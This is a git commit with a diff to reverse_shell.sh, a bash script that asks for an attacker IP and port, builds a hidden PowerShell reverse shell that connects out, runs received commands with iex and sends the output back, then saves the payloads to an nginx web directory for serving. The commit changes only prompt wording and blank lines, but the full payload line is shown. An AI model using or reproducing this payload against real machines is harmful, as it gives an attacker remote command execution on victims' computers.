976331b36dbd7fdce75327c472d7df8925c13ab0
C04CH <88205891+c04ch1337@users.noreply.github.com>
2025-06-13 13:13:50 -0500

    Update reverse_shell.sh

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -1,8 +1,7 @@
-
 #!/bin/bash
 
-read -p "Enter your IP (Attacker): " IP
-read -p "Enter your Port (Attacker): " PORT
+read -p "Enter your IP: " IP
+read -p "Enter your Port: " PORT
 
 echo "[*] Generating base64 PowerShell reverse shell..."
 PS_COMMAND="powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"
@@ -24,4 +23,3 @@ EOF
 
 echo "[*] Payloads saved to /usr/share/nginx/html/reverse_payloads.txt"
 cat /usr/share/nginx/html/reverse_payloads.txt
-
